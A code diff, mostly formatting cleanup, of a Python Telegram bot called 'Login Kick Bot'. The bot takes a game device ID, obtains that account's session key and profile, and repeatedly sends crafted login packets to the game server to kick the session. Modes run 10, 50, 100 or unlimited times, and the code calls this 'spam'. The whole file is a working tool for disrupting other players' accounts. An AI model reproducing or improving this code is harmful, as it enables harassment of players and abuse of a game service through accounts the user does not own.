@@ -22,11 +22,11 @@ from telegram.ext import (
 #     GameLogin, GameConnection, SdpStruct, map_rank,
 #     CLIENT_VERSION, CHANNEL
 # )
-# import zstd   # or zstandard as zstd
+# import zstandard as zstd
 # ==========================================================
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
-ALLOWED_USERS = set()  # e.g. {123456789} or leave empty for everyone
+ALLOWED_USERS = set()
 
 WAITING_DEVICE = 1
 active_jobs: Dict[int, bool] = {}
@@ -35,7 +35,6 @@ logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(
 logger = logging.getLogger(__name__)
 
 
-# ---------- your original functions (keep exact) ----------
 def fetch_session_profile(device_id: str) -> Optional[Dict[str, Any]]:
     acc, zone, stat = GameLogin(device_id).run()
     if not acc or not zone:
@@ -50,8 +49,8 @@ def fetch_session_profile(device_id: str) -> Optional[Dict[str, Any]]:
         gs_host = conn.game_host
         gs_port = conn.game_port
         creation_ts = conn.creation_ts
-        skin_info = conn.get_skin_role_info(acc, zone) if hasattr(conn, 'get_skin_role_info') else {}
-        ban_stat = conn.check_ban_status() if hasattr(conn, 'check_ban_status') else "NORMAL"
+        skin_info = conn.get_skin_role_info(acc, zone) if hasattr(conn, "get_skin_role_info") else {}
+        ban_stat = conn.check_ban_status() if hasattr(conn, "check_ban_status") else "NORMAL"
         conn.cleanup()
         skin_info = skin_info if isinstance(skin_info, dict) else {}
         nick = skin_info.get(2) or f"Player_{acc}"
@@ -61,23 +60,23 @@ def fetch_session_profile(device_id: str) -> Optional[Dict[str, Any]]:
         cur_rank_val = skin_info.get(6, 0) or 0
         max_rank_val = skin_info.get(15, 0) or cur_rank_val
         return {
-            'device_id': device_id,
-            'account_id': acc,
-            'session_key': sess_key,
-            'zone_id': zone,
-            'creation_ts': creation_ts,
-            'game_host': gs_host,
-            'game_port': gs_port,
-            'gs_info': f"{gs_host}:{gs_port}",
-            'nickname': nick,
-            'level': level,
-            'rank': map_rank(cur_rank_val),
-            'highest_rank': map_rank(max_rank_val) if max_rank_val else map_rank(cur_rank_val),
-            'skin_count': skin_cnt,
-            'hero_count': hero_cnt,
-            'ban_status': ban_stat,
+            "device_id": device_id,
+            "account_id": acc,
+            "session_key": sess_key,
+            "zone_id": zone,
+            "creation_ts": creation_ts,
+            "game_host": gs_host,
+            "game_port": gs_port,
+            "gs_info": f"{gs_host}:{gs_port}",
+            "nickname": nick,
+            "level": level,
+            "rank": map_rank(cur_rank_val),
+            "highest_rank": map_rank(max_rank_val) if max_rank_val else map_rank(cur_rank_val),
+            "skin_count": skin_cnt,
+            "hero_count": hero_cnt,
+            "ban_status": ban_stat,
         }
-    except:
+    except Exception:
         return None
 
 
@@ -87,31 +86,33 @@ def send_session_kick(profile: Dict[str, Any], timeout: float = 4.5) -> Tuple[bo
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(timeout)
-        sock.connect((profile['game_host'], profile['game_port']))
+        sock.connect((profile["game_host"], profile["game_port"]))
         body_struct = SdpStruct({
-            0: profile['account_id'],
-            1: profile['session_key'],
-            2: profile['zone_id'],
+            0: profile["account_id"],
+            1: profile["session_key"],
+            2: profile["zone_id"],
             4: CLIENT_VERSION,
             13: CHANNEL,
-            15: profile['device_id']
+            15: profile["device_id"],
         }).data
         pkt = SdpStruct({0: 10001, 1: 1, 5: body_struct}).data
         comp = zstd.compress(pkt)
         flags = (len(comp) + 4) | (16 << 24)
-        sock.send(flags.to_bytes(4, 'big') + comp)
-        q = b''
+        sock.send(flags.to_bytes(4, "big") + comp)
+        q = b""
         got_ack = False
         while len(q) < 4:
             d = sock.recv(4096)
-            if not d: break
+            if not d:
+                break
             q += d
         if len(q) >= 4:
-            fl = int.from_bytes(q[:4], 'big')
+            fl = int.from_bytes(q[:4], "big")
             sz = fl & 0xFFFFFF
             while len(q) < sz:
                 d = sock.recv(4096)
-                if not d: break
+                if not d:
+                    break
                 q += d
             if len(q) >= sz:
                 got_ack = True
@@ -121,21 +122,24 @@ def send_session_kick(profile: Dict[str, Any], timeout: float = 4.5) -> Tuple[bo
     except socket.timeout:
         elapsed_ms = (time.time() - t0) * 1000
         if sock:
-            try: sock.close()
-            except: pass
+            try:
+                sock.close()
+            except Exception:
+                pass
         return False, elapsed_ms, "TIMEOUT"
     except Exception as e:
         elapsed_ms = (time.time() - t0) * 1000
         if sock:
-            try: sock.close()
-            except: pass
+            try:
+                sock.close()
+            except Exception:
+                pass
         return False, elapsed_ms, str(e)
-# ----------------------------------------------------------
 
 
 def profile_text(data: Dict[str, Any]) -> str:
-    ban = str(data.get('ban_status', 'NORMAL'))
-    ban_disp = ban if 'ban' in ban.lower() else "NORMAL (Clean)"
+    ban = str(data.get("ban_status", "NORMAL"))
+    ban_disp = ban if "ban" in ban.lower() else "NORMAL (Clean)"
     return (
         f"📋 <b>ACCOUNT PROFILE</b>\n"
         f"────────────────────\n"
@@ -154,10 +158,14 @@ def profile_text(data: Dict[str, Any]) -> str:
 def mode_kb():
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("🧪 Single", callback_data="m1")],
-        [InlineKeyboardButton("⚡ 10x", callback_data="m2"),
-         InlineKeyboardButton("🚀 50x", callback_data="m3")],
-        [InlineKeyboardButton("💥 100x", callback_data="m4"),
-         InlineKeyboardButton("♾️ Unlimited", callback_data="m5")],
+        [
+            InlineKeyboardButton("⚡ 10x", callback_data="m2"),
+            InlineKeyboardButton("🚀 50x", callback_data="m3"),
+        ],
+        [
+            InlineKeyboardButton("💥 100x", callback_data="m4"),
+            InlineKeyboardButton("♾️ Unlimited", callback_data="m5"),
+        ],
         [InlineKeyboardButton("🛠️ Custom", callback_data="m6")],
         [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
     ])
@@ -169,7 +177,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return ConversationHandler.END
     await update.message.reply_text(
         "⚡ <b>Login Kick Bot</b>\n\nSend Device ID\n/stop to cancel spam",
-        parse_mode="HTML"
+        parse_mode="HTML",
     )
     return WAITING_DEVICE
 
@@ -212,7 +220,10 @@ async def mode_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     if q.data == "m6":
         context.user_data["custom"] = True
-        await q.edit_message_text("Send: <code>loops delay</code>\nExample: <code>30 1.2</code>", parse_mode="HTML")
+        await q.edit_message_text(
+            "Send: <code>loops delay</code>\nExample: <code>30 1.2</code>",
+            parse_mode="HTML",
+        )
 
 
 async def custom_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -223,7 +234,7 @@ async def custom_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parts = update.message.text.split()
         total = int(parts[0])
         delay = float(parts[1]) if len(parts) > 1 else 2.0
-    except:
+    except Exception:
         await update.message.reply_text("Format: loops delay")
         return
     profile = context.user_data.get("profile")
@@ -249,16 +260,19 @@ async def run_spam(message, context, profile, total, delay):
             loop = asyncio.get_event_loop()
             ok, lat, _ = await loop.run_in_executor(None, send_session_kick, profile)
             lats.append(lat)
-            success += 1 if ok else 0
-            fail += 0 if ok else 1
+            if ok:
+                success += 1
+            else:
+                fail += 1
             if count % 5 == 0 or (total and count >= total):
-                avg = sum(lats)/len(lats) if lats else 0
+                avg = sum(lats) / len(lats) if lats else 0
                 try:
                     await status.edit_text(
-                        f"⚡ {count}{'/'+str(total) if total else '/∞'}\n"
+                        f"⚡ {count}{'/' + str(total) if total else '/∞'}\n"
                         f"✅ {success}  ❌ {fail}\nAvg {avg:.0f}ms"
                     )
-                except: pass
+                except Exception:
+                    pass
             if total and count >= total:
                 break
             if delay > 0:
@@ -266,15 +280,15 @@ async def run_spam(message, context, profile, total, delay):
     except Exception as e:
         logger.exception(e)
     dur = time.time() - t0
-    avg = sum(lats)/len(lats) if lats else 0
-    pct = success/count*100 if count else 0
+    avg = sum(lats) / len(lats) if lats else 0
+    pct = success / count * 100 if count else 0
     await status.edit_text(
         f"📊 <b>DONE</b>\n"
         f"{profile['nickname']} (<code>{profile['account_id']}</code>)\n"
-        f"⏱ {dur/60:.1f}m | {count} loops\n"
+        f"⏱ {dur / 60:.1f}m | {count} loops\n"
         f"✅ {success} ({pct:.1f}%)  ❌ {fail}\n"
         f"⚡ {avg:.0f}ms avg",
-        parse_mode="HTML"
+        parse_mode="HTML",
     )
     active_jobs.pop(chat_id, None)
 
@@ -299,7 +313,11 @@ def main():
     app = Application.builder().token(BOT_TOKEN).build()
     conv = ConversationHandler(
         entry_points=[CommandHandler("start", start)],
-        states={WAITING_DEVICE: [MessageHandler(filters.TEXT & \~filters.COMMAND, receive_device)]},
+        states={
+            WAITING_DEVICE: [
+                MessageHandler(filters.TEXT & \~filters.COMMAND, receive_device)
+            ]
+        },
         fallbacks=[CommandHandler("cancel", cancel)],
     )
     app.add_handler(conv)
